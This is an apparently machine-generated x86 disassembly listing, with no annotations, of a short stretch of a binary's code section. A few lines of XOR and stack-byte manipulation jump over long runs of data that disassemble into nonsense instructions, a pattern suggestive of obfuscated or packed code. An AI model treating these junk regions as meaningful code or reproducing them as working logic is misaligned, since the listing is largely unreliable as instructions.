  40c379:	mov    edx,DWORD PTR [edx+0x1a8]
  40c37f:	shr    ecx,0x2
  40c382:	xor    esi,esi
  40c384:	mov    ecx,0x329e695d
  40c389:	xor    eax,ecx
  40c38b:	or     eax,esi
  40c38d:	mov    DWORD PTR [edx],eax
  40c38f:	mov    eax,DWORD PTR [ebp-0x18]
  40c392:	mov    edx,DWORD PTR [ebp-0x14]
  40c395:	shrd   eax,edx,0x2
  40c399:	shr    edx,0x2
  40c39c:	mov    edx,DWORD PTR [ebp-0x18]
  40c39f:	mov    esi,DWORD PTR [ebp-0x14]
  40c3a2:	xor    eax,ecx
  40c3a4:	xor    esi,esi
  40c3a6:	or     eax,esi
  40c3a8:	mov    ds:0x42275c,eax
  40c3ad:	mov    BYTE PTR [ebp-0x2],0x4f
  40c3b1:	mov    BYTE PTR [ebp-0x1],0xf9
  40c3b5:	movzx  eax,BYTE PTR [ebp-0x1]
  40c3b9:	shl    edx,0x1e
  40c3bc:	mov    dl,BYTE PTR [ebp-0x2]
  40c3bf:	jmp    0x40c7b5
  40c3c4:	(bad)  
  40c3c5:	xor    al,0x5b
  40c3c7:	mov    dl,0x5b
  40c3c9:	call   0x6af2:0x3fac243e
  40c3d0:	jb     0x40c365
  40c3d2:	daa    
  40c3d3:	stos   BYTE PTR es:[edi],al
  40c3d4:	or     eax,0x6e1818fd
  40c3d9:	adc    bl,BYTE PTR [eax]
  40c3db:	sbb    BYTE PTR [eax-0x9],bl
  40c3de:	push   edx
  40c3df:	daa    
  40c3e0:	jb     0x40c374
  40c3e2:	pop    ecx
  40c3e3:	stos   BYTE PTR es:[edi],al
  40c3e4:	clc    
  40c3e5:	pop    edx
  40c3e6:	pusha  
  40c3e7:	xor    DWORD PTR [edi],edx
  40c3e9:	cld    
  40c3ea:	test   BYTE PTR fs:0xe489e9e2,0x72
  40c3f2:	mov    al,0xb3
  40c3f4:	mov    gs,WORD PTR [esi]
  40c3f6:	cmp    BYTE PTR [ebp+edx*4+0x702e7ed6],dl
  40c3fd:	rcl    BYTE PTR [ecx-0x3b],1
  40c400:	sub    bh,ah
  40c402:	sbb    edx,ecx
  40c404:	mov    eax,ds:0xd96d9250
  40c409:	jnp    0x40c41b
  40c40b:	adc    bh,BYTE PTR [edx-0x3d]
  40c40e:	sbb    BYTE PTR [ebx+0x66],al
  40c411:	(bad)  
  40c412:	jmp    0x40c461
  40c414:	pushf  
  40c415:	push   ax
  40c417:	mov    ah,0x26
  40c419:	adc    BYTE PTR [ecx],bl
  40c41b:	hlt    
  40c41c:	mov    bh,bl
  40c41e:	pop    es
  40c41f:	call   FWORD PTR [edx-0x332f6f2c]
  40c425:	stos   DWORD PTR es:[edi],eax
  40c426:	or     eax,0x8965ccf7
  40c42b:	cli    
  40c42c:	stos   DWORD PTR es:[edi],eax
  40c42d:	jbe    0x40c43d
  40c42f:	jns    0x40c460
  40c431:	mov    ds:0x8f471585,al
  40c436:	push   0x95235137
  40c43b:	inc    edi
  40c43c:	mov    ecx,0xee0795d6
  40c441:	setp   BYTE PTR [ebx-0x40]
  40c445:	test   al,0xc2
  40c447:	or     al,0xd0
  40c449:	mov    WORD PTR [edx],0x92a6
  40c44e:	sbb    edi,0xffffffe5
  40c451:	add    edi,DWORD PTR [edx+0x7b]
  40c454:	jbe    0x40c423
  40c456:	ins    DWORD PTR es:[edi],dx
  40c457:	mov    eax,ds:0x2e71819d
  40c45c:	jle    0x40c409
  40c45e:	out    0xd3,eax
  40c460:	(bad)  
  40c461:	push   esp
  40c462:	out    0xeb,eax
  40c464:	sar    BYTE PTR [edx],cl
  40c466:	push   ebp
  40c467:	call   0x12a6c614
  40c46c:	add    ah,BYTE PTR [ebp+eiz*2-0x7b]
  40c470:	inc    ebx
  40c471:	cld    
  40c472:	out    dx,eax
  40c473:	jb     0x40c4c7
  40c475:	or     eax,0x79c251c2
  40c47a:	mov    edx,0x2fe4df46
  40c47f:	and    BYTE PTR [ebx],cl
  40c481:	adc    ecx,ecx
  40c483:	aas    
  40c484:	ins    DWORD PTR es:[edi],dx
  40c485:	jns    0x40c4a5
  40c487:	xchg   esp,eax
  40c488:	test   DWORD PTR [esi+0x6b],ebx
  40c48b:	push   edx
  40c48c:	int    0xfe
  40c48e:	xchg   esp,eax
  40c48f:	mov    ah,BYTE PTR [eax+0x47997c4a]
  40c495:	lock das 
  40c497:	push   0x1a0823e7
  40c49c:	sbb    bl,BYTE PTR [ebp+0x26]
  40c49f:	add    cl,0x3b
  40c4a2:	(bad)
  40c4a6:	rcr    DWORD PTR [edx],0xfb
  40c4a9:	mov    DWORD PTR [eax],0xa0c0f951
  40c4af:	cmp    bl,BYTE PTR [edx-0x1f]
  40c4b2:	enter  0xb0c2,0x3e
  40c4b6:	xchg   BYTE PTR [eax+0x78296230],bl
  40c4bc:	ret    0x3bd8
  40c4bf:	shr    DWORD PTR [edx+ecx*8-0x6c],cl
  40c4c3:	push   cs
  40c4c4:	aam    0xb7
  40c4c6:	adc    ch,BYTE PTR [ecx-0x2c]
  40c4c9:	fwait
  40c4ca:	cmc    
  40c4cb:	sbb    BYTE PTR [esi-0x2d],0xef
  40c4cf:	rcr    DWORD PTR [esi+0x3080061a],0x4b
  40c4d6:	add    al,0x42
  40c4d8:	push   eax
  40c4d9:	push   ds
  40c4da:	dec    esp
  40c4db:	dec    ebx
  40c4dc:	stos   BYTE PTR es:[edi],al
  40c4dd:	es xchg esi,eax
  40c4df:	hlt    
  40c4e0:	retf   0x6b95
  40c4e3:	in     al,0x2b
  40c4e5:	imul   ebx,DWORD PTR [edx-0x48341c55],0x27b2b1e0
  40c4ef:	clc    
  40c4f0:	das    
  40c4f1:	cmp    BYTE PTR [ecx+0x2c],ah
  40c4f4:	xor    DWORD PTR [ebx+0x5f],0x23
  40c4f8:	pop    ds
  40c4f9:	inc    edi
  40c4fa:	xor    bh,ah
  40c4fc:	dec    ebx
  40c4fd:	cmp    ebx,esp
  40c4ff:	pop    edx
  40c500:	and    DWORD PTR [esi-0x48],esi
  40c503:	daa    
  40c504:	adc    al,dh
  40c506:	shr    DWORD PTR [edi+0x278ad52a],1
  40c50c:	imul   ebx,eax,0xee2e26ed
  40c512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c513:	aam    0xe
  40c515:	adc    ebp,DWORD PTR [ebx]
  40c517:	test   al,0x79
  40c519:	sub    cl,BYTE PTR [ebp-0x246c53de]
  40c51f:	push   ds
  40c520:	sub    DWORD PTR [eax+ebp*4],eax
  40c523:	mov    dh,BYTE PTR [eax+0x206625c1]
  40c529:	xlat   BYTE PTR ds:[ebx]
  40c52a:	mov    ds:0xfa13d6ee,al
  40c52f:	and    BYTE PTR [ebx-0x45219ae9],dh
  40c535:	mov    esi,0xf08e790a
  40c53a:	add    al,0xd3
  40c53c:	push   cs
  40c53d:	push   0x915cf682
  40c542:	int3   
  40c543:	sti    
  40c544:	jge    0x40c4d4
  40c546:	je     0x40c506
  40c548:	add    al,0x61
  40c54a:	addr16 aad 0xaa
  40c54d:	ins    BYTE PTR es:[edi],dx
  40c54e:	jge    0x40c4f9
  40c550:	and    ah,BYTE PTR [ebx+0x17]
  40c553:	dec    edi
  40c554:	aad    0xac
  40c556:	mov    ebp,edi
  40c558:	test   DWORD PTR [ebp-0x3977eb59],0x75c1e085
  40c562:	popa   
  40c563:	push   ebx
  40c564:	out    0x22,al
  40c566:	push   esi
  40c567:	adc    al,0x8
  40c569:	jns    0x40c576
  40c56b:	out    0xfe,al
  40c56d:	inc    edx
  40c56e:	pop    es
  40c56f:	lods   eax,DWORD PTR ds:[esi]
  40c570:	pushf  
  40c571:	jns    0x40c51e
  40c573:	mov    esp,0x4559a27b
  40c578:	out    0xdf,al
  40c57a:	dec    ebp
  40c57b:	ficom  WORD PTR [edx-0x46c1dc4d]
  40c581:	out    dx,al
  40c582:	nop
  40c583:	scas   eax,DWORD PTR es:[edi]
  40c584:	cmp    DWORD PTR [esi+0x50],ebx
  40c587:	sti    
  40c588:	sahf   
  40c589:	fstp   TBYTE PTR [ebp-0x1b]
  40c58c:	clc    
  40c58d:	pop    ebp
  40c58e:	push   0xffffffa3
  40c590:	addr16 aaa 
  40c592:	gs out dx,eax
  40c594:	inc    eax
  40c595:	mov    ds:0x87d4c8a6,al
  40c59a:	push   DWORD PTR [edx]
  40c59c:	sbb    al,0xc7
  40c59e:	retf   
  40c59f:	rol    DWORD PTR [ebx],0xcb
  40c5a2:	inc    edx
  40c5a3:	xchg   esp,eax
  40c5a4:	test   eax,0xac87253
  40c5a9:	push   edi
  40c5aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5ab:	call   0x8640da7f
  40c5b0:	outs   dx,DWORD PTR ds:[esi]
  40c5b2:	cli    
  40c5b3:	fsubr  st,st(5)
  40c5b5:	adc    al,BYTE PTR [ecx-0x37]
  40c5b8:	rcl    BYTE PTR [esi],1
  40c5ba:	adc    edx,DWORD PTR [eax]
  40c5bc:	scas   al,BYTE PTR es:[edi]
  40c5bd:	mov    esi,0xb4806aca
  40c5c2:	dec    edi
  40c5c3:	rcr    bh,cl
  40c5c5:	push   0xd3ab87d1
  40c5ca:	scas   eax,DWORD PTR es:[edi]
  40c5cb:	ret    0xc67
  40c5ce:	push   ebx
  40c5cf:	fistp  WORD PTR ds:0x7f655fd3
  40c5d5:	pop    es
  40c5d6:	xor    eax,0xa7d1341b
  40c5db:	or     bl,BYTE PTR [edi]
  40c5dd:	ja     0x40c645
  40c5df:	or     al,0x42
  40c5e1:	or     ebx,eax
  40c5e3:	jbe    0x40c56c
  40c5e5:	mov    dh,0xfe
  40c5e7:	stc    
  40c5e8:	leave  
  40c5e9:	(bad)  
  40c5ea:	sub    eax,0x4f77aec4
  40c5ef:	or     eax,0xead7e98d
  40c5f4:	aaa    
  40c5f5:	mov    cs,WORD PTR [ebx+0x48]
  40c5f8:	rcl    BYTE PTR [ebx+0x5d],1
  40c5fb:	fsubr  DWORD PTR [edx+0x53303f00]
  40c601:	jmp    0xfb10:0xd21fca2f
  40c608:	jns    0x40c64b
  40c60a:	add    BYTE PTR [edx+edx*8-0x35777120],cl
  40c611:	jo     0x40c5a8
  40c613:	sub    eax,ebp
  40c615:	push   ecx
  40c616:	jmp    FWORD PTR [esi]
  40c618:	jbe    0x40c5f5
  40c61a:	xor    BYTE PTR [edx+0x37],dl
  40c61d:	cmp    dl,BYTE PTR [eax-0x71]
  40c620:	fiadd  WORD PTR [esi-0x80]
  40c623:	jns    0x40c659
  40c625:	mov    al,ds:0x4f30375b
  40c62a:	ds jmp 0x40c68c
  40c62d:	and    al,0xaa
  40c62f:	mov    bh,BYTE PTR [ecx+0x31]
  40c632:	xchg   esp,edx
  40c634:	pop    ecx
  40c635:	jle    0x40c6ad
  40c637:	inc    ecx
  40c638:	fidiv  DWORD PTR [edx+0x6635ce19]
  40c63e:	push   edx
  40c63f:	aas    
  40c640:	call   FWORD PTR [ecx]
  40c642:	gs dec ecx
  40c644:	xor    BYTE PTR [eax],al
  40c646:	and    bh,BYTE PTR [ebx-0x5]
  40c649:	xor    bh,BYTE PTR [edi+0x16]
  40c64c:	iret   
  40c64d:	sbb    BYTE PTR [edx],dh
  40c64f:	push   edi
  40c650:	mov    ds:0x9e58f85a,eax
  40c655:	xchg   esp,eax
  40c656:	push   edi
  40c657:	mov    dh,0x1d
  40c659:	xor    eax,0xcaa18a14
  40c65e:	outs   dx,DWORD PTR ds:[esi]
  40c65f:	inc    ebp
  40c660:	xchg   esi,eax
  40c661:	jge    0x40c679
  40c663:	dec    edx
  40c664:	pop    ecx
  40c665:	stos   DWORD PTR es:[edi],eax
  40c666:	sub    BYTE PTR [bx-0x79],al
  40c66a:	ins    BYTE PTR es:[edi],dx
  40c66b:	jo     0x40c68d
  40c66d:	jo     0x40c693
  40c66f:	push   ebp
  40c670:	dec    ebx
  40c671:	test   BYTE PTR ds:0x8606d269,0x8a
  40c678:	push   ebx
  40c679:	mov    esp,0xf6933539
  40c67e:	ret    0x948
  40c681:	sahf   
  40c682:	xor    eax,DWORD PTR [ebx]
  40c684:	shl    DWORD PTR [eax-0x2797c89c],cl
  40c68a:	jecxz  0x40c6aa
  40c68c:	pop    ds
  40c68d:	ins    BYTE PTR es:[edi],dx
  40c68e:	jg     0x40c628
  40c690:	lods   al,BYTE PTR ds:[esi]
  40c691:	cmp    ebp,0xf2435a5f
  40c697:	ss ss fwait
  40c69a:	lock inc esp
  40c69c:	shl    esi,1
  40c69e:	int    0x49
  40c6a0:	icebp  
  40c6a1:	add    eax,0x9503c288
  40c6a6:	test   DWORD PTR [ebx],ebp
  40c6a8:	mov    al,dh
  40c6aa:	push   ecx
  40c6ab:	jae    0x40c6c3
  40c6ad:	and    al,0x92
  40c6af:	adc    DWORD PTR [eax+0x280da674],eax
  40c6b5:	cdq    
  40c6b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6b7:	cmp    DWORD PTR [edx-0x3a],esp
  40c6ba:	(bad)  
  40c6bb:	mov    ds:0x251c59ae,al
  40c6c0:	out    dx,eax
  40c6c1:	mov    ds:0xf427aaa3,al
  40c6c6:	mov    ah,0x41
  40c6c8:	sbb    BYTE PTR [ebp+0x47],0x75
  40c6cc:	sbb    al,0x84
  40c6ce:	leave  
  40c6cf:	pop    edi
  40c6d0:	xor    eax,0xf31df3ab
  40c6d5:	push   0xa47a4a12
  40c6da:	in     eax,dx
  40c6db:	sub    bl,BYTE PTR [ebx+edi*2+0x28]
  40c6df:	cwde   
  40c6e0:	sub    ch,cl
  40c6e2:	ret    
  40c6e3:	loope  0x40c6df
  40c6e5:	imul   ecx,ebp,0xaf80fc90
  40c6eb:	push   esi
  40c6ec:	cmovno edi,ebx
  40c6ef:	xchg   ecx,eax
  40c6f0:	sbb    al,BYTE PTR [edx]
  40c6f2:	inc    esp
  40c6f3:	cmp    ebp,ecx
  40c6f5:	sub    DWORD PTR ds:0x2bee6fd,0x51
  40c6fc:	xchg   ebp,eax
  40c6fd:	add    bh,BYTE PTR [ebx-0x2e]
  40c700:	repnz add ah,BYTE PTR [ebx]
  40c703:	or     al,0xfb
  40c705:	ds int 0xdd
  40c708:	inc    eax
  40c709:	cdq    
  40c70a:	inc    ebx
  40c70b:	mov    ds:0xaaf85d9,al
  40c710:	jnp    0x40c6b7
  40c712:	jmp    0x9873:0xd4668508
  40c719:	dec    eax
  40c71a:	sub    eax,0x24a70528
  40c71f:	push   edi
  40c720:	mov    ecx,DWORD PTR [ecx+0x703b0480]
  40c726:	mov    ecx,DWORD PTR [esi-0x237a6c75]
  40c72c:	and    eax,0xbb97188
  40c731:	stc    
  40c732:	xchg   DWORD PTR [ecx+0x5ec016dd],ebp
  40c738:	shl    BYTE PTR [ebp+0x1e],1
  40c73b:	ror    DWORD PTR [edi+eax*4-0x2f],cl
  40c73f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c740:	lahf   
  40c741:	mov    cl,0x65
  40c743:	out    dx,eax
  40c744:	sahf   
  40c745:	mov    bl,0x2e
  40c747:	sub    ah,BYTE PTR [eax-0x19]
  40c74a:	stos   BYTE PTR es:[edi],al
  40c74b:	mov    eax,ecx
  40c74d:	push   edi
  40c74e:	push   ecx
  40c74f:	add    DWORD PTR [ecx-0x6eff5570],ebp
  40c755:	or     ebp,edi
  40c757:	add    al,BYTE PTR [ecx+0x5730f70f]
  40c75d:	aaa    
  40c75e:	nop
  40c75f:	out    dx,eax
  40c760:	cmp    dl,BYTE PTR [esi]
  40c762:	or     al,0x84
  40c764:	sub    al,0x66
  40c766:	int3   
  40c767:	clc    
  40c768:	lea    ecx,[edi+0x3d]
  40c76b:	pop    ss
  40c76c:	rcr    BYTE PTR [eax],cl
  40c76e:	cs ss push 0xe09c91c1
  40c775:	in     eax,0x8c
  40c777:	cmp    ebp,ecx
  40c779:	mov    al,ds:0x2b231ab
  40c77e:	lods   eax,DWORD PTR ds:[esi]
  40c77f:	mov    eax,0x171f7044
  40c784:	data16 xor dh,ah
  40c787:	je     0x40c79f
  40c789:	sbb    DWORD PTR [esi-0x22],ebx
  40c78c:	out    0xbe,eax
  40c78e:	sbb    al,0x7e
  40c790:	rcr    BYTE PTR [ebp+0x3cd2ccb5],0x5d
  40c797:	xchg   ebp,eax
  40c798:	ss xchg edi,eax
  40c79a:	mov    eax,ds:0x573dd8f2
  40c79f:	sbb    al,0xfb
  40c7a1:	pop    esi
  40c7a2:	inc    ecx
  40c7a3:	cmp    dl,BYTE PTR [ecx-0x53]
  40c7a6:	neg    DWORD PTR [eax+0x26e1a27f]
  40c7ac:	mov    al,0x0
  40c7ae:	iret   
  40c7af:	stos   BYTE PTR es:[edi],al
  40c7b0:	dec    edi
  40c7b1:	jno    0x40c77c
  40c7b3:	cwde   
  40c7b4:	(bad)  
  40c7b5:	xor    al,0x42
  40c7b7:	add    al,dl
  40c7b9:	push   0x6
  40c7bb:	add    eax,0xfa
  40c7c0:	mov    BYTE PTR [ebp-0x4],al
  40c7c3:	mov    BYTE PTR [ebp-0x3],0x67
  40c7c7:	pop    eax
  40c7c8:	mov    BYTE PTR [ebp-0x1],al
  40c7cb:	mov    BYTE PTR [ebp-0x2],0x3
  40c7cf:	mov    dl,BYTE PTR [ebp-0x2]
  40c7d2:	movzx  esi,dl
  40c7d5:	cdq    
  40c7d6:	idiv   esi
  40c7d8:	mov    dl,BYTE PTR [ebp-0x1]
  40c7db:	add    al,dl
  40c7dd:	mov    dl,BYTE PTR [ebp-0x3]
  40c7e0:	or     al,dl
  40c7e2:	mov    dl,BYTE PTR [ebp-0x4]
  40c7e5:	add    al,0x3a
  40c7e7:	cmp    dl,al
  40c7e9:	jmp    0x40cbdf
  40c7ee:	xchg   esi,eax
  40c7ef:	and    al,dl
  40c7f1:	cmc    
  40c7f2:	mov    ds:0xdc222674,al
  40c7f7:	mov    cl,BYTE PTR [edi-0x222ccd90]
  40c7fd:	jle    0x40c862
  40c7ff:	cmc    
  40c800:	sbb    BYTE PTR [eax],bl
  40c802:	outs   dx,BYTE PTR ds:[esi]
  40c803:	adc    bl,BYTE PTR [eax]
  40c805:	sbb    BYTE PTR [edi-0xa],dl
  40c808:	sbb    eax,0x5bd11f9
  40c80d:	jmp    0xfa3a479b
  40c812:	and    eax,0xad29a200
  40c817:	daa    
  40c818:	pop    esp
  40c819:	mov    DWORD PTR [ebx],ebx
  40c81b:	cs call 0x317c:0x7ef7b0b5
  40c823:	push   0xffffff9a
  40c825:	pop    ecx
  40c826:	ret    0xf4fd
  40c829:	repnz inc edx
  40c82b:	push   ecx
  40c82c:	jl     0x40c869
  40c82e:	rcl    bl,1
  40c830:	adc    eax,0xfe2b5849
  40c835:	aaa    
  40c836:	nop
  40c837:	idiv   ecx
  40c839:	xor    eax,0x1f9c0cfe
  40c83e:	fsubr  QWORD PTR [edi]
  40c840:	fs iret 
  40c842:	loopne 0x40c814
  40c844:	sub    dl,BYTE PTR [ebp-0x72]
  40c847:	(bad)  
  40c849:	jmp    0x40c7e1
  40c84b:	int    0x4c
  40c84d:	mov    ah,BYTE PTR [eax-0x69]
  40c850:	cs bnd jmp 0xf30bf6ab
  40c857:	loop   0x40c895
  40c859:	test   al,0xb8
  40c85b:	and    edx,DWORD PTR [eax-0x6c94c07c]
  40c861:	adc    ah,BYTE PTR [esi+0x74e20a78]
  40c867:	fimul  WORD PTR [ebp-0x54]
  40c86a:	or     eax,0xd77d2a70
  40c86f:	add    DWORD PTR [ecx+0x29],ecx
  40c872:	les    ebx,FWORD PTR [ebx+0x0]
  40c875:	mov    dh,0xa9
  40c877:	xchg   esi,eax
  40c878:	dec    eax
  40c879:	pop    esi
  40c87a:	cmp    ecx,DWORD PTR [edx+0x1cf8bb26]
  40c880:	lods   eax,DWORD PTR ds:[esi]
  40c881:	dec    esp
  40c882:	jno    0x40c895
  40c884:	jg     0x40c83a
  40c886:	mov    dl,0x31
  40c888:	mov    ch,0xa0
  40c88a:	popa   
  40c88b:	add    esp,esp
  40c88d:	je     0x40c890
  40c88f:	pop    ebp
  40c890:	inc    ecx
  40c891:	sbb    BYTE PTR ds:0x5d1d6ae5,bh
  40c897:	add    DWORD PTR [ecx+0x48290a13],edi
  40c89d:	xor    esi,DWORD PTR [eax+0x22]
  40c8a0:	add    al,BYTE PTR [eax+0x2fb80e60]
  40c8a6:	jmp    0xec2f7bc8
  40c8ab:	call   0x3947c3c9
  40c8b0:	mov    edi,0xe86f60ba
  40c8b5:	pop    esp
  40c8b7:	sbb    eax,0xb324b922
  40c8bc:	mov    esp,0x674c476f
  40c8c1:	xchg   edi,eax
  40c8c2:	dec    ebx
  40c8c3:	jg     0x40c8f0
  40c8c5:	or     eax,0x363ee2e4
  40c8ca:	cmc    
  40c8cb:	retf   0x1e84
  40c8ce:	out    dx,eax
  40c8cf:	aad    0x6d
  40c8d1:	add    BYTE PTR [eax-0x62],0xa5
  40c8d5:	popf   
  40c8d6:	dec    edx
  40c8d7:	pushf  
  40c8d8:	xor    dh,dh
  40c8da:	cli    
  40c8db:	or     BYTE PTR [ecx-0x7c],ch
  40c8de:	int3   
  40c8df:	push   cs
  40c8e0:	jae    0x40c8e1
  40c8e2:	xchg   ebx,eax
  40c8e3:	and    ch,BYTE PTR [esi]
  40c8e5:	xor    eax,ebp
  40c8e7:	inc    ecx
  40c8e8:	pop    esi
  40c8e9:	rcr    cl,cl
  40c8eb:	inc    ecx
  40c8ec:	cli    
  40c8ed:	nop
  40c8ee:	pop    ebp
  40c8ef:	(bad)  
  40c8f0:	pop    ss
  40c8f1:	fs push ds
  40c8f3:	aam    0x1e
  40c8f5:	and    edx,ecx
  40c8f7:	mov    eax,ds:0xc8e1f941
  40c8fc:	jmp    0x25b318d4
  40c901:	(bad)  
  40c902:	mov    al,0x64
  40c904:	ins    DWORD PTR es:[edi],dx
  40c905:	nop
  40c906:	and    ah,dh
  40c908:	or     BYTE PTR [edi],dl
  40c90a:	pop    ebx
  40c90b:	sbb    eax,0x298735dc
  40c910:	out    dx,eax
  40c911:	(bad)  
  40c912:	cli    
  40c913:	out    dx,eax
  40c914:	xor    BYTE PTR [edx],bl
  40c916:	push   ss
  40c917:	jle    0x40c93f
  40c919:	push   ds
  40c91a:	jo     0x40c95c
  40c91c:	dec    eax
  40c91d:	push   edx
  40c91e:	aaa    
  40c91f:	mov    cl,0xe8
  40c921:	push   esi
  40c922:	jg     0x40c964
  40c924:	fnstcw WORD PTR [esi+0x6ae5c80a]
  40c92a:	sbb    al,0x7e
  40c92c:	jmp    0x550d508b
  40c931:	repnz stc 
  40c933:	lock ins DWORD PTR es:[edi],dx
  40c935:	mov    esi,0x5706cc09
  40c93a:	jae    0x40c8f1
  40c93c:	(bad)  
  40c93d:	dec    ecx
  40c93e:	mov    edi,0x9489bbcf
  40c943:	or     dh,BYTE PTR [eax]
  40c945:	outs   dx,BYTE PTR ds:[esi]
  40c946:	mov    ebp,0x267667b9
  40c94b:	mov    ch,BYTE PTR [esi+0x7f549bb7]
  40c951:	mov    edx,0x98ffb723
  40c956:	cli    
  40c957:	iret   
  40c958:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c959:	xchg   DWORD PTR ds:0xa173f193,eax
  40c95f:	inc    DWORD PTR [esi-0x2e]
  40c962:	jo     0x40c921
  40c964:	or     eax,0xb235070
  40c969:	jmp    0x8f49:0xf01b8a7d
  40c970:	fwait
  40c971:	imul   eax,edx,0x854dec17
  40c977:	pop    esp
  40c978:	mov    ebx,0xfdfe5b74
  40c97d:	test   al,0x86
  40c97f:	mov    dl,0xe4
  40c981:	pop    ecx
  40c982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c983:	hlt    
  40c984:	pop    ds
  40c985:	fs mov edx,0x9f9c7052
  40c98b:	hlt    
  40c98c:	jb     0x40c90e
  40c98e:	in     eax,dx
  40c98f:	pop    eax
  40c990:	jp     0x40c9f6
  40c992:	mov    WORD PTR [ecx+esi*2-0x7a49d6a3],gs
  40c999:	inc    edi
  40c99a:	pushf  
  40c99b:	mov    esp,0x3a2b8de6
  40c9a0:	fs jo  0x40c953
  40c9a3:	loopne 0x40c9c3
  40c9a5:	das    
  40c9a6:	jp     0x40c9bb
  40c9a8:	stos   DWORD PTR es:[edi],eax
  40c9a9:	inc    edx
  40c9aa:	popa   
  40c9ab:	adc    eax,0x943e7af2
  40c9b0:	imul   edi,DWORD PTR [edx-0x58],0xfa7e7458
  40c9b7:	cli    
  40c9b8:	cld    
  40c9b9:	mov    esi,0xaa194172
  40c9be:	fdivrp st(6),st
  40c9c0:	or     DWORD PTR [ecx+ecx*8],ebp
  40c9c3:	mov    ch,0x99
  40c9c5:	and    ebp,DWORD PTR [ecx-0x2]
  40c9c8:	adc    ecx,0xafa7e345
  40c9ce:	xchg   esi,eax
  40c9cf:	and    al,0xaa
  40c9d1:	push   0x31
  40c9d3:	add    eax,0xcb23b5f6
  40c9d8:	xchg   ebp,eax
  40c9d9:	retf   
  40c9da:	adc    al,0x6
  40c9dc:	or     bl,dh
  40c9de:	mov    DWORD PTR [ecx+eiz*2],edx
  40c9e1:	cmp    edx,DWORD PTR ds:0x8220b403
  40c9e7:	inc    ecx
  40c9e8:	xor    ebp,ebx
  40c9ea:	push   esp
  40c9eb:	retf   
  40c9ec:	mov    DWORD PTR [esi],esp
  40c9ee:	pop    ecx
  40c9ef:	ror    BYTE PTR [ebx-0x156b7949],1
  40c9f5:	and    BYTE PTR [eax+0x4dc96c2],al
  40c9fb:	mov    dh,0xfc
  40c9fd:	hlt    
  40c9fe:	xchg   edi,eax
  40c9ff:	hlt    
  40ca00:	imul   BYTE PTR [edx-0x70257b31]
  40ca06:	xor    eax,0x1c7b0b76
  40ca0b:	inc    ebp
  40ca0c:	xor    ebp,edi
  40ca0e:	xchg   edi,eax
  40ca0f:	or     BYTE PTR [edx+0x6dce453],dl
  40ca15:	test   BYTE PTR [ebx+esi*1+0x50a8f129],bl
  40ca1c:	add    cl,BYTE PTR [ebx-0x3e]
  40ca1f:	rol    bh,cl
  40ca21:	push   eax
  40ca22:	inc    edx
  40ca23:	push   eax
  40ca24:	out    0x8f,al
  40ca26:	(bad)  
  40ca27:	repz dec ebx
  40ca29:	fist   DWORD PTR [esi+0xeca16e3]
  40ca2f:	sbb    eax,0xd2557d5e
  40ca34:	inc    ebp
  40ca35:	stc    
  40ca36:	xchg   ebx,eax
  40ca37:	push   ecx
  40ca38:	clc    
  40ca39:	jbe    0x40c9ce
  40ca3b:	scas   al,BYTE PTR es:[edi]
  40ca3c:	or     eax,0x79edc494
  40ca41:	or     esp,DWORD PTR [ecx+0x3376bc9a]
  40ca47:	jmp    0xc342:0x27c80f33
  40ca4e:	popa   
  40ca4f:	out    dx,eax
  40ca50:	jb     0x40ca51
  40ca52:	mov    ebp,0x1e550ae
  40ca57:	test   cl,al
  40ca59:	sub    DWORD PTR ds:0x9c3eccd7,eax
  40ca5f:	cwde   
  40ca60:	test   DWORD PTR [ebp+0x22299b3c],esi
  40ca66:	or     esp,DWORD PTR [ecx]
  40ca68:	jno    0x40ca37
  40ca6a:	das    
  40ca6b:	push   ebx
  40ca6c:	jecxz  0x40cab6
  40ca6e:	cmp    edx,DWORD PTR cs:[ecx-0x6f727ae]
  40ca75:	cmp    al,0xa4
  40ca77:	iret   
  40ca78:	bound  ecx,QWORD PTR [ebx-0x6e507f2e]
  40ca7e:	into   
  40ca7f:	sub    esi,DWORD PTR [ecx]
  40ca81:	imul   ebp,DWORD PTR [esi],0xfffffffe
  40ca84:	imul   esp,DWORD PTR [esi-0x72bb3d84],0xdfdc0098
  40ca8e:	in     al,dx
  40ca8f:	(bad)  
  40ca90:	mov    ebp,0xb5e503fa
  40ca95:	mov    bh,0x6f
  40ca97:	dec    eax
  40ca98:	test   al,0x5b
  40ca9a:	ret    
  40ca9b:	dec    esp
  40ca9c:	aaa    
  40ca9d:	jae    0x40ca78
  40ca9f:	pop    ebp
  40caa0:	pushf  
  40caa1:	cli    
  40caa2:	add    al,0x75
  40caa4:	mov    bh,0xd3
  40caa6:	mov    esi,0x6d8ea31
  40caab:	scas   eax,DWORD PTR es:[edi]
  40caac:	aaa    
  40caad:	fisubr WORD PTR [eax-0x65]
  40cab0:	dec    edi
  40cab1:	lds    ebp,FWORD PTR [ebx]
  40cab3:	sti    
  40cab4:	clc    
  40cab5:	neg    DWORD PTR [eax-0x14b473de]
  40cabb:	ss mov ebx,0x9f442605
  40cac1:	test   esp,esp
  40cac3:	lods   al,BYTE PTR ds:[esi]
  40cac4:	dec    esi
  40cac5:	or     DWORD PTR [ebx+esi*2+0x2],esi
  40cac9:	mov    ds:0x4fa82d08,eax
  40cace:	and    BYTE PTR [ecx-0x73],cl
  40cad1:	cs mov bl,0xc0
  40cad4:	sar    ah,cl
  40cad6:	scas   al,BYTE PTR es:[edi]
  40cad7:	das    
  40cad8:	inc    ebx
  40cad9:	int3   
  40cada:	cmc    
  40cadb:	mov    BYTE PTR [edx],dh
  40cadd:	and    BYTE PTR [eax+0x19083ee3],0x4b
  40cae4:	out    dx,al
  40cae5:	or     ah,0x81
  40cae8:	inc    ecx
  40cae9:	ret    
  40caea:	lea    ebx,[eax-0xaf40c4b]
  40caf0:	dec    eax
  40caf1:	sbb    al,0xd5
  40caf3:	push   ebp
  40caf4:	ret    
  40caf5:	enter  0x75fd,0x21
  40caf9:	fisub  DWORD PTR [ebx+0x13edd3f4]
  40caff:	or     bh,BYTE PTR [edi+0x23]
  40cb02:	test   esp,ebx
  40cb04:	in     al,0xf4
  40cb06:	xchg   ecx,eax
  40cb07:	pop    ds
  40cb08:	mov    ebx,0xc48ceac1
  40cb0d:	popf   
  40cb0e:	or     al,0xdc
